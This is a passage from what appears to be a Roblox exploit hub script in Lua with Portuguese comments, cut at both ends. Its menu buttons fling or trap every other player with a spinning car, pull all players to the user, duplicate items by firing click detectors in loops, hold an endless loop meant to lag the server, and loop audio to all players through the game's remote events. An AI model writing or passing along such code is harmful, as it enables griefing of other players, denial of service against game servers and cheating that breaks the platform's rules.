                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until Humanoid.Sit
                end
            end
        end

        -- Adiciona o BodyGyro ao carro para controle de movimento
        local SpinGyro = Instance.new("BodyGyro")
        SpinGyro.Parent = PCar.PrimaryPart
        SpinGyro.MaxTorque = Vector3.new(1e7, 1e7, 1e7)
        SpinGyro.P = 1e7
        SpinGyro.CFrame = PCar.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(90), 0)

        -- Função de Fling em cada jogador por 3 segundos
        local function flingPlayer(TargetC, TargetRP, TargetH)
            Angles = 0
            local endTime = tick() + 1  -- Define o tempo final em 2 segundos a partir de agora
            while tick() < endTime do
                Angles = Angles + 100
                task.wait()

                -- Movimentos e ângulos para o Fling
                local kill = function(alvo, pos, angulo)
                    PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)
                end

                -- Fling para várias posições ao redor do TargetRP
                kill(TargetRP, CFrame.new(0, 3, 0), CFrame.Angles(math.rad(Angles), 0, 0))
                kill(TargetRP, CFrame.new(0, -1.5, 2), CFrame.Angles(math.rad(Angles), 0, 0))
                kill(TargetRP, CFrame.new(2, 1.5, 2.25), CFrame.Angles(math.rad(50), 0, 0))
                kill(TargetRP, CFrame.new(-2.25, -1.5, 2.25), CFrame.Angles(math.rad(30), 0, 0))
                kill(TargetRP, CFrame.new(0, 1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))
                kill(TargetRP, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))
            end
        end

        -- Itera sobre todos os jogadores
        for _, Target in pairs(game.Players:GetPlayers()) do
            -- Pula o jogador local
            if Target ~= Player then
                local TargetC = Target.Character
                local TargetH = TargetC and TargetC:FindFirstChildOfClass("Humanoid")
                local TargetRP = TargetC and TargetC:FindFirstChild("HumanoidRootPart")

                -- Se encontrar o alvo e seus componentes, executa o fling
                if TargetC and TargetH and TargetRP then
                    flingPlayer(TargetC, TargetRP, TargetH)  -- Fling no jogador atual
                end
            end
        end

        -- Retorna o jogador para sua posição original
        task.wait(0.5)
        PCar:SetPrimaryPartCFrame(CFrame.new(0, 0, 0))
        task.wait(0.5)
        Humanoid.Sit = false
        task.wait(0.5)
        RootPart.CFrame = OldPos

        -- Remove o BodyGyro após o efeito
        SpinGyro:Destroy()
	print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Car Jail",
	Callback = function()
      	local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart and RootPart.CFrame or nil

        if not Humanoid or not RootPart or not Vehicles then return end

        -- Lista de proteção (Whitelist)
        local ProtectedList = {
            [7870544119] = true,
            [7680301371] = true,
            [3845424860] = true,
            [7991200153] = true,
            [7685128251] = true,
            [7118994826] = true,
            [7905238071] = true,
            [2803402717] = true,
            [3396788926] = true,
            [4863206819] = true,
            [1549110910] = true,
            [4854018750] = true,
            [807242034] = true,
            [4432430525] = true,
        }

        local PlayersList = {} -- Lista de jogadores a serem processados
        for _, p in pairs(game.Players:GetPlayers()) do
            if p ~= Player and not ProtectedList[p.UserId] then
                table.insert(PlayersList, p)
            end
        end

        local function ProcessPlayer(TargetPlayer)
            local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
            if not PCar then
                -- Move jogador para a coordenada inicial
                RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
                task.wait(0.5)
                PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
            end

            local Seat = PCar and PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
            if Seat then
                repeat
                    task.wait()
                    RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                until Humanoid.Sit
            end

            local TargetC = TargetPlayer.Character
            if TargetC then
                local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
                local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
                if TargetH and TargetRP then
                    while not TargetH.Sit do
                        task.wait()

                        -- Rotação aleatória ao redor do jogador
                        local randomX = math.random(-360, 360)
                        local randomY = math.random(-360, 360)
                        local randomZ = math.random(-360, 360)

                        -- Função para movimentar o carro
                        local function moveCar(alvo, offset, rotation)
                            local newPosition = alvo.Position + offset
                            local newCFrame = CFrame.new(newPosition) * rotation
                            PCar:SetPrimaryPartCFrame(newCFrame)
                        end

                        -- Movimentos do carro ao redor do jogador alvo
                        moveCar(TargetRP, Vector3.new(0, 1, 0), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, -2.25, 5), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, 2.25, 0.25), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                    end

                    -- Teleporte para a coordenada final
                    task.wait(0.1)
                    PCar:SetPrimaryPartCFrame(CFrame.new(1, 73, -488))

                    -- Espera e apaga o carro
                    task.wait(0.6)
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
                    task.wait(0.2)
                    Humanoid.Sit = false
                    if OldPos then
                        RootPart.CFrame = OldPos
                    end
                end
            end
        end

        -- Processa cada jogador da lista
        for _, TargetPlayer in ipairs(PlayersList) do
            ProcessPlayer(TargetPlayer)
        end
	print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Car Bring all",
	Callback = function()
      	local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart.CFrame  -- Armazenar a posição original do jogador

        if not Humanoid or not RootPart then return end

        -- Lista de proteção com novos IDs
        local ProtectedList = {
            [7870544119] = true,
            [7680301371] = true,
            [3845424860] = true,
            [7991200153] = true,
            [7685128251] = true,
            [7118994826] = true,
            [7905238071] = true,
            [2803402717] = true,
            [3396788926] = true,
            [4863206819] = true,
            [1549110910] = true,
            [4854018750] = true,
            [807242034] = true,
            [4432430525] = true,
        }

        local PlayersList = {} -- Lista de jogadores a serem processados
        for _, p in pairs(game.Players:GetPlayers()) do
            if p ~= Player and not ProtectedList[p.UserId] then
                table.insert(PlayersList, p)
            end
        end

        local function ProcessPlayer(TargetPlayer)
            local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
            if not PCar then
                -- Teletransporta o jogador para uma posição inicial antes de pegar o carro
                RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
                task.wait(0.5)
                PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
                local Seat = PCar and PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat
                        task.wait()
                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until Humanoid.Sit
                end
            end

            local TargetC = TargetPlayer.Character
            if TargetC then
                local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
                local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
                if TargetH and TargetRP then
                    while not TargetH.Sit do
                        task.wait()

                        -- Rotação aleatória ao redor do jogador
                        local randomX = math.random(-360, 360)
                        local randomY = math.random(-360, 360)
                        local randomZ = math.random(-360, 360)

                        -- Função para movimentar o carro
                        local moveCar = function(alvo, offset, rotation)
                            local newPosition = alvo.Position + offset
                            local newCFrame = CFrame.new(newPosition) * rotation
                            PCar:SetPrimaryPartCFrame(newCFrame)
                        end

                        -- Movimentos do carro ao redor do jogador alvo
                        moveCar(TargetRP, Vector3.new(0, 1, 0), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, -2.25, 5), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, 2.25, 0.25), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                    end

                    -- Teleporte para a posição original
                    task.wait(0.1)
                    PCar:SetPrimaryPartCFrame(OldPos)  -- Usando a posição original do jogador

                    -- Espera e apaga o carro
                    task.wait(0.6)
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
                    task.wait(0.2)
                    Humanoid.Sit = false
                    RootPart.CFrame = OldPos  -- Retorna para a posição original do jogador
                end
            end
        end

        -- Processa cada jogador da lista
        for _, TargetPlayer in ipairs(PlayersList) do
            ProcessPlayer(TargetPlayer)
        end
	print("button pressed")
  	end    
})


local Tab = Window:MakeTab({
    Name = "Tools/Lag Server",
    Icon = "rbxassetid://124324266461881",
    PremiumOnly = false
})


local Section = Tab:AddSection({
	Name = "Duplicar Lanternas"
})

local countValue = 0

Tab:AddTextbox({
	Name = "Insira o Número de Lanternas",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		countValue = tonumber(Value)
        if not countValue then
            print("TemplariosHub")
        end
	end	  
})

Tab:AddButton({
	Name = "Duplicar Lanternas",
	Callback = function()
      		if countValue and countValue > 0 then
        -- Define referências
        local player = game.Players.LocalPlayer
        local initialPosition = player.Character.HumanoidRootPart.Position
        local targetPart = workspace["001_Lots"][player.Name .. "House"].HousePickedByPlayer.HouseModel.ToolsFlashLight.Touch

        -- Verifica se a parte existe
        if targetPart then
            -- Teleporta o jogador para a part e reduz a velocidade
            player.Character.HumanoidRootPart.CFrame = targetPart.CFrame
            player.Character.Humanoid.WalkSpeed = 0

            -- Executa o fireclickdetector o número de vezes especificado
            for i = 1, countValue do
                fireclickdetector(workspace["001_Lots"][player.Name .. "House"].HousePickedByPlayer.HouseModel.ToolsFlashLight.Tools.FlashLight.ClickDetector)
                wait(0.5)
            end

            -- Retorna o jogador ao local original e restaura a velocidade
            player.Character.HumanoidRootPart.CFrame = CFrame.new(initialPosition)
            player.Character.Humanoid.WalkSpeed = 16
        else
            -- Notificação com imagem caso a part não exista
            game.StarterGui:SetCore("SendNotification", {
                Title = "Templarios Hub",
                Text = "Falha ao Duplicar Lanternas, Verifique se Colocou essa Casa. (Casa da Agency)",
                Duration = 5,
                Icon = "rbxassetid://78517296345487" -- Substitua pelo ID da imagem desejada
            })
        end
    else
        print("TemplariosHub")
    end
  	end    
})

Tab:AddParagraph("Atenção!","Lembre-se que você deve pegar a Casa da Agency Para o Duplicar Lanternas Funcionar!")

local Section = Tab:AddSection({
	Name = "Duplicar Extintores"
})

local player = game.Players.LocalPlayer
local dupeCount -- Variável para armazenar o número digitado

Tab:AddTextbox({
	Name = "Insira o Número de Extintores",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		dupeCount = tonumber(Value) -- Converte o valor digitado para número
		if not dupeCount or dupeCount <= 0 then
			print("Por favor, insira um número válido.") -- Mensagem de erro se não for um número válido
		end
	end	  
})

local function getCharacterComponents()
	local character = player.Character or player.CharacterAdded:Wait()
	return character:WaitForChild("Humanoid"), character:WaitForChild("HumanoidRootPart")
end

local function findClickDetector()
	-- Verifica se o objeto FireX e seus filhos existem no novo caminho
	local fireX = workspace.WorkspaceCom["001_DayCare"].Tools:FindFirstChild("FireX")
	if fireX then
		-- Procura por um ClickDetector dentro de FireX
		for _, child in ipairs(fireX:GetChildren()) do
			if child:IsA("ClickDetector") then
				return child -- Retorna o ClickDetector encontrado
			end
		end
	end
	return nil -- Retorna nil se nenhum ClickDetector for encontrado
end

Tab:AddButton({
	Name = "Duplicar Extintores",
	Callback = function()
		local humanoid, rootPart = getCharacterComponents() -- Obtém componentes atualizados
		local clickDetector = findClickDetector() -- Obtém o ClickDetector dentro de FireX

		if dupeCount and dupeCount > 0 and clickDetector then
			local originalPosition = rootPart.Position -- Armazena a posição inicial do jogador
			local originalSpeed = humanoid.WalkSpeed -- Armazena a velocidade original do jogador

			-- Teleporta o jogador para a nova posição e define a velocidade para 0
			rootPart.CFrame = CFrame.new(433.39031982421875, -107.79502868652344, 101.17525482177734)
			humanoid.WalkSpeed = 0

			-- Executa o fireclickdetector a quantidade de vezes desejada
			for i = 1, dupeCount do
				fireclickdetector(clickDetector)
				wait(0.5) -- Intervalo entre execuções
			end

			-- Aguarda 3 segundos antes de restaurar a posição e a velocidade
			wait(3)
			rootPart.CFrame = CFrame.new(originalPosition)
			humanoid.WalkSpeed = originalSpeed
		else
			print("Por favor, insira um número válido ou verifique se o ClickDetector existe.") -- Mensagem de erro se não for um número válido ou o ClickDetector não for encontrado
		end
	end    
})

-- Reatribui componentes após o reset
player.CharacterAdded:Connect(function()
	player.Character:WaitForChild("Humanoid").Changed:Connect(function()
		humanoid, rootPart = getCharacterComponents()
	end)
end)

local Section = Tab:AddSection({
	Name = "Duplicar Guitarras"
})

local player = game.Players.LocalPlayer
local humanoid = player.Character:WaitForChild("Humanoid")
local rootPart = player.Character:WaitForChild("HumanoidRootPart")
local dupeCount -- Variável para armazenar o número digitado

Tab:AddTextbox({
	Name = "Insira o Número de Guitarras",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		dupeCount = tonumber(Value) -- Converte o valor digitado para número
		if not dupeCount or dupeCount <= 0 then
			print("Por favor, insira um número válido.") -- Mensagem de erro se não for um número válido
		end
	end	  
})

Tab:AddButton({
	Name = "Duplicar Guitarras",
	Callback = function()
      		-- Verifica se o valor é válido
		if dupeCount and dupeCount > 0 then
			local originalPosition = rootPart.Position -- Armazena a posição inicial do jogador
			local originalSpeed = humanoid.WalkSpeed -- Armazena a velocidade original do jogador

			-- Teleporta o jogador para a nova posição e define a velocidade para 0
			rootPart.CFrame = CFrame.new(-379.8940124511719, 18.473968505859375, 211.9053955078125)
			humanoid.WalkSpeed = 0
			
			-- Executa o fireclickdetector a quantidade de vezes desejada
			for i = 1, dupeCount do
				fireclickdetector(workspace.WorkspaceCom["001_GiveTools"].ElectricGuitar.ClickDetector)
				game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.F,false,game)
				wait(0.5) -- Intervalo entre execuções
			end

			-- Aguarda 3 segundos antes de restaurar a posição e a velocidade
			wait(3)
			rootPart.CFrame = CFrame.new(originalPosition)
			humanoid.WalkSpeed = originalSpeed
		else
			print("Por favor, insira um número válido.") -- Mensagem de erro se não for um número válido
		end
  	end    
})

local Section = Tab:AddSection({
	Name = "Duplicar Violões"
})

local player = game.Players.LocalPlayer
local humanoid = player.Character:WaitForChild("Humanoid")
local rootPart = player.Character:WaitForChild("HumanoidRootPart")
local dupeCount -- Variável para armazenar o número digitado

Tab:AddTextbox({
	Name = "Insira o Número de Violões",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		dupeCount = tonumber(Value) -- Converte o valor digitado para número
		if not dupeCount or dupeCount <= 0 then
			print("Por favor, insira um número válido.") -- Mensagem de erro se não for um número válido
		end
	end	  
})

Tab:AddButton({
	Name = "Duplicar Violões",
	Callback = function()
      		-- Verifica se o valor é válido
		if dupeCount and dupeCount > 0 then
			local originalPosition = rootPart.Position -- Armazena a posição inicial do jogador
			local originalSpeed = humanoid.WalkSpeed -- Armazena a velocidade original do jogador

			-- Teleporta o jogador para a nova posição e define a velocidade para 0
			rootPart.CFrame = CFrame.new(-379.8940124511719, 18.473968505859375, 211.9053955078125)
			humanoid.WalkSpeed = 0
			
			-- Executa o fireclickdetector a quantidade de vezes desejada
			for i = 1, dupeCount do
				fireclickdetector(workspace.WorkspaceCom["001_GiveTools"].Guitar.ClickDetector)
				game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.F,false,game)
				wait(0.5) -- Intervalo entre execuções
			end

			-- Aguarda 3 segundos antes de restaurar a posição e a velocidade
			wait(3)
			rootPart.CFrame = CFrame.new(originalPosition)
			humanoid.WalkSpeed = originalSpeed
		else
			print("Por favor, insira um número válido.") -- Mensagem de erro se não for um número válido
		end
  	end    
})

local Section = Tab:AddSection({
	Name = "Equipar todos os items"
})

Tab:AddButton({
    Name = "Equipar Todos os Items",
    Callback = function()
local function equiptool()
  for i,v in ipairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
    if v:IsA("Tool") then
      v.Parent = game.Players.LocalPlayer.Character
    end
  end
end
equiptool()

    end
})

local Section = Tab:AddSection({
	Name = "Lag Server"
})

-- Variáveis
local isLooping = false -- Controle do loop
local originalPosition = nil -- Para armazenar a posição original do jogador
local player = game.Players.LocalPlayer -- Referência ao jogador local
local selectedDevice = "Celular" -- Valor padrão do dispositivo

Tab:AddDropdown({
    Name = "Selecionar o Que Vai Usar Para Lagar o Servidor",
    Default = "Celular",
    Options = {"Laptop", "Celular", "Caça Fantasmas", "Celular e Laptop"},
    Callback = function(Value)
        selectedDevice = Value -- Atualiza o dispositivo selecionado com base na escolha do usuário
    end
})

-- Função para iniciar o loop
local function startLoop()
    if not isLooping then
        isLooping = true
        originalPosition = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position

        -- Define coordenadas baseadas no dispositivo selecionado
        local teleportPosition
        if selectedDevice == "Laptop" then
            teleportPosition = Vector3.new(-123.742, 20.074, 251.402)
        elseif selectedDevice == "Celular" then
            teleportPosition = Vector3.new(-123.742, 20.074, 251.402)
        elseif selectedDevice == "Caça Fantasmas" then
            teleportPosition = Vector3.new(-320.216, 7.4, -112.32)
        elseif selectedDevice == "Celular e Laptop" then
            teleportPosition = Vector3.new(-123.742, 20.074, 251.402)
        end

        -- Teleporta o jogador para a nova posição
        if teleportPosition then
            player.Character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
        end

        -- Define a velocidade para 0
        player.Character.Humanoid.WalkSpeed = 0

        -- Loop principal
        while isLooping do
            -- Verifica o dispositivo selecionado e executa o ClickDetector correspondente
            if selectedDevice == "Laptop" then
                fireclickdetector(workspace.WorkspaceCom["001_CommercialStores"].CommercialStorage1.Store.Tools.Laptop.ClickDetector)
            elseif selectedDevice == "Celular" then
                fireclickdetector(workspace.WorkspaceCom["001_CommercialStores"].CommercialStorage1.Store.Tools:GetChildren()[3].ClickDetector)
            elseif selectedDevice == "Caça Fantasmas" then
                fireclickdetector(workspace.WorkspaceCom["001_GiveTools"].GhostMeter.ClickDetector)
            elseif selectedDevice == "Celular e Laptop" then
                fireclickdetector(workspace.WorkspaceCom["001_CommercialStores"].CommercialStorage1.Store.Tools:GetChildren()[3].ClickDetector)
                wait(0.1)
                fireclickdetector(workspace.WorkspaceCom["001_CommercialStores"].CommercialStorage1.Store.Tools.Laptop.ClickDetector)
            end
            wait(0.01) -- Espera 0.01 segundo
        end
    end
end

-- Função para parar o loop e voltar à posição original
local function stopLoop()
    if isLooping then
        isLooping = false -- Para o loop
        wait(0.1) -- Espera um pouco antes de voltar

        -- Teleporta de volta para a posição original
        if originalPosition then
            player.Character.HumanoidRootPart.CFrame = CFrame.new(originalPosition)
        end

        -- Restaura a velocidade para 16
        player.Character.Humanoid.WalkSpeed = 16
    end
end

-- Reinicializa as variáveis em caso de reset do personagem
player.CharacterAdded:Connect(function()
    isLooping = false -- Garante que o loop seja parado ao resetar
    originalPosition = nil -- Reseta a posição original
end)

-- Botão para iniciar o loop
Tab:AddButton({
    Name = "Lagar Servidor",
    Callback = function()
        startLoop()
    end
})

-- Botão para parar o loop
Tab:AddButton({
    Name = "Parar de Lagar",
    Callback = function()
        stopLoop()
    end
})

Tab:AddParagraph("Atenção", "Caso seu Celular não Seja Muito Bom não é Recomendado que use o Lagar Servidor!")

local Section = Tab:AddSection({
    Name = "Áudio"
})

Tab:AddButton({
	Name = "Pegar Sniper (Necessário)",
	Callback = function()
local args = {
    [1] = "PickingTools",
    [2] = "Sniper"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

  	end    
})

-- TextBox para inserir o ID
Tab:AddTextbox({
    Name = "Digite o ID do Áudio",
    Default = "",
    TextDisappear = true,
    Callback = function(value)
        Value = value
    end
})

-- Botão para executar a função uma vez
Tab:AddButton({
    Name = "Tocar Áudio",
    Callback = function()
        if Value then
            local args = {
                [1] = game:GetService("Players").LocalPlayer.Character.Sniper.Handle,
                [2] = Value,
                [3] = 1
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
            
            local soundId = "rbxassetid://" .. Value
            local sound = Instance.new("Sound")
            sound.SoundId = soundId
            sound.Parent = game.Workspace
            sound.Volume = 0.3
            
            sound:Play()
            wait(3)
            sound:Stop()
        else
            OrionLib:MakeNotification({
                Name = "Erro",
                Content = "Insira um ID válido antes de executar.",
                Image = "rbxassetid://132225387260946",
                Time = 5
            })
        end
    end
})

-- Toggle para ativar/desativar o loop
Tab:AddToggle({
    Name = "Loop Audio",
    Default = false,
    Callback = function(value)
        looping = value
        
        while looping do
            if Value then
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Sniper.Handle,
                    [2] = Value,
                    [3] = 1
                }
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
                
                local soundId = "rbxassetid://" .. Value
                local sound = Instance.new("Sound")
                sound.SoundId = soundId
                sound.Parent = game.Workspace
                sound.Volume = 0.1
                
                sound:Play()
                wait(3)
                sound:Stop()
            else
                OrionLib:MakeNotification({
                    Name = "Erro",
                    Content = "Insira um ID antes de ativar o loop som.",
                    Image = "rbxassetid://132225387260946",
                    Time = 5
                })
                break
            end
            wait(1) -- Intervalo entre execuções
        end
    end
})

Tab:AddParagraph("Atenção","Você deve segurar a <font color='rgb(0, 255, 0)'>Sniper</font> para que o áudio seja executado corretamente de forma FE, suporta o som por 3 segundos")

local Section = Tab:AddSection({
    Name = "Áudio All"
})

Tab:AddButton({
	Name = "Pegar Sniper (Necessário)",
	Callback = function()
local args = {
    [1] = "PickingTools",
    [2] = "Sniper"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

  	end    
})

-- Variáveis
local Value = ""  -- ID do som será inserido pelo usuário
local Speed = 1   -- Velocidade padrão (pode ser ajustada)
local isPlaying = false  -- Estado do toggle
local interval = 0.1  -- Tempo padrão entre execuções

-- Função para tocar o som localmente
local function playSoundLocally(Value, Speed)
    local soundId = "rbxassetid://" .. Value
    local sound = Instance.new("Sound")
    sound.SoundId = soundId
    sound.Parent = game.Workspace
    sound.Volume = 0.3
    sound.PlaybackSpeed = Speed  -- Velocidade do som

    sound:Play()

    -- O som será destruído após 3 segundos, mas isso não impede a execução contínua
    game:GetService("Debris"):AddItem(sound, 3)
end

-- Função para enviar o evento ao servidor
local function playSoundServer(Value, Speed)
    local args = {
        [1] = workspace,
        [2] = Value,
        [3] = Speed
    }
    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
end

-- TextBox para inserir o ID do som
Tab:AddTextbox({
    Name = "ID do Áudio",
    Default = "",
    TextDisappear = true,
    Callback = function(value)
        Value = value  -- Atualizando o ID do som
    end
})

-- TextBox para inserir a velocidade do som
Tab:AddTextbox({
    Name = "Velocidade do Áudio",
    Default = "1",
    TextDisappear = true,
    Callback = function(value)
        Speed = tonumber(value) or 1  -- Garantindo que a velocidade seja um número, se não for, usa 1
    end
})

-- Botão para tocar o som uma vez
Tab:AddButton({
    Name = "Tocar Áudio",
    Callback = function()
        if Value == "" then
            print("Você não colocou nemhum ID de Áudio")
        else
            playSoundLocally(Value, Speed)  -- Toca o som localmente
            playSoundServer(Value, Speed)  -- Envia o evento ao servidor
        end
    end
})

-- Toggle para tocar o som repetidamente
Tab:AddToggle({
    Name = "Loop Áudio All",
    Default = false,
    Callback = function(state)
        isPlaying = state  -- Atualizando o estado do toggle
        if isPlaying then
            -- Loop para tocar o som enquanto o toggle estiver ativado
            coroutine.wrap(function()
                while isPlaying do
                    if Value ~= "" then
                        playSoundLocally(Value, Speed)  -- Toca o som localmente
                        playSoundServer(Value, Speed)  -- Envia o evento ao servidor
                    else
                        print("Você não colocou nemhum ID de Áudio")
                        break
                    end
                    wait(interval)  -- Usa o intervalo definido pelo usuário
                end
            end)()
        end
    end
})

-- TextBox para ajustar o intervalo do toggle
Tab:AddTextbox({
    Name = "Intervalo para o Loop Áudio All",
    Default = "0.5",
    TextDisappear = true,
    Callback = function(value)
        interval = tonumber(value) or 0.5  -- Atualiza o intervalo, valor padrão é 0.1
        if interval <= 0 then
            interval = 0.5  -- Garante que o intervalo não seja zero ou negativo
            print("Intervalo do Loop Áudio All Definido")
        end
    end
})

Tab:AddParagraph("Atenção","No áudio all, você não precisa segurar a sniper na mão para funcionar mas deve ter ela no seu inventário. Também suporta 3 segundos.")


local Section = Tab:AddSection({
	Name = "Wall Items"
})


Tab:AddButton({
	Name = "Wall Box",
	Callback = function()
      		local function fragiotakis() local Player = game.Players.LocalPlayer local Character = Player.Character or Player.CharacterAdded:Wait() local RootPart = Character:WaitForChild("HumanoidRootPart") local Clone = game:GetService("Workspace"):FindFirstChild("WorkspaceCom") and game:GetService("Workspace").WorkspaceCom:FindFirstChild("001_GiveTools") and game:GetService("Workspace").WorkspaceCom["001_GiveTools"]:FindFirstChild("Box")

if Clone and Clone:FindFirstChild("ClickDetector") then
    local OldPos = RootPart.CFrame

    for i = 1, 12 do
        RootPart.CFrame = Clone.CFrame
        fireclickdetector(Clone.ClickDetector)
        task.wait(0)
    end

    RootPart.CFrame = OldPos
else
    warn("tu deve ter bugado ou o mapa deu algum bo!")
end

end

for i = 1, 50 do fragiotakis() task.wait(0.0) end

local function BundaGorda() 
local args
 = { [1] = "PickingTools",
 [2] = "Box" }

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
wait(0.1)
local player = game.Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")

local tools = {}
for _, tool in pairs(backpack:GetChildren()) do
    if tool.Name == "Box" then
        table.insert(tools, tool)
    end
end

local startPosition = Vector3.new(0, 4, 0)
local spacingX, spacingY = 1, 2
local columns = 5

for i, tool in ipairs(tools) do
    local row = math.floor((i - 1) / columns)
    local column = (i - 1) % columns
    tool.Parent = player.Character
    tool.GripPos = startPosition + Vector3.new(column * spacingX, -row * spacingY, 0)
    tool.Grip = CFrame.new(startPosition + Vector3.new(column * spacingX, -row * spacingY, 0)) * CFrame.Angles(math.rad(90), 0, 0)
end

end

BundaGorda()
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Wall Extinto",
	Callback = function()
      		local function fragiotakis()
    local Player = game.Players.LocalPlayer
    local Character = Player.Character or Player.CharacterAdded:Wait()
    local RootPart = Character:WaitForChild("HumanoidRootPart")
    local Clone = game:GetService("Workspace"):FindFirstChild("WorkspaceCom") 
        and game:GetService("Workspace").WorkspaceCom:FindFirstChild("001_GiveTools") 
        and game:GetService("Workspace").WorkspaceCom["001_GiveTools"]:FindFirstChild("FireX")

    if Clone and Clone:FindFirstChild("ClickDetector") then
        local OldPos = RootPart.CFrame

        for i = 1, 21 do
            RootPart.CFrame = Clone.CFrame
            fireclickdetector(Clone.ClickDetector)
            task.wait(0)
        end

        RootPart.CFrame = OldPos
    else
        warn("tu deve ter bugado ou o ClickDetector deu algum erro!")
    end
end

for i = 1, 20 do
    fragiotakis()
    task.wait(0.0)
end

local function Cugostoso()
    local args = {
        [1] = "PickingTools",
        [2] = "FireX"
    }

    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
    wait(0.1)
    local player = game.Players.LocalPlayer
    local backpack = player:WaitForChild("Backpack")
    
    local tools = {}
    for _, tool in pairs(backpack:GetChildren()) do
        if tool.Name == "FireX" then
            table.insert(tools, tool)
        end
    end

    local startPosition = Vector3.new(0, 3, 0)
    local spacing = 1

    for i, tool in ipairs(tools) do
        tool.Parent = player.Character
        tool.GripPos = startPosition + Vector3.new(i * spacing, 0, 0)
        tool.Grip = CFrame.new(startPosition + Vector3.new(i * spacing, 0, 0)) * CFrame.Angles(math.rad(90), 0, 0)
    end
end

Cugostoso()
print("button pressed")
  	end    
})


local Section = Tab:AddSection({
	Name = "Lag Botões"
})


Tab:AddButton({
	Name = "Lag Taser",
	Callback = function()
      		local function duplicarTaser()
    local Player = game.Players.LocalPlayer
    local Character = Player.Character or Player.CharacterAdded:Wait()
    local RootPart = Character:WaitForChild("HumanoidRootPart")
    local TaserPath = game:GetService("Workspace"):FindFirstChild("WorkspaceCom") 
        and game:GetService("Workspace").WorkspaceCom["001_GiveTools"]:FindFirstChild("Taser")

    if TaserPath and TaserPath:FindFirstChild("ClickDetector") then
        local OldPos = RootPart.CFrame

        for i = 1, 12 do
            RootPart.CFrame = TaserPath.CFrame
            fireclickdetector(TaserPath:FindFirstChild("ClickDetector"))
            task.wait(0)
        end

        RootPart.CFrame = OldPos
    else
        warn("Erro ao encontrar o Taser! Tente novamente.")
    end
end

-- Loop infinito para duplicação
while true do
    duplicarTaser()
    task.wait(0.001)
end
print("button pressed")
  	end    
})


local toggles = {
    DupeBasketball = false
}

local function clickNormally(object)
    local clickDetector = object:FindFirstChildWhichIsA("ClickDetector")
    if clickDetector then
        fireclickdetector(clickDetector) -- Clica normalmente
    end
end

local function dupeItem(itemPath, maxTeleports)
    if itemPath then
        local teleportCount = 0
        while teleportCount < maxTeleports and toggles.DupeBasketball do
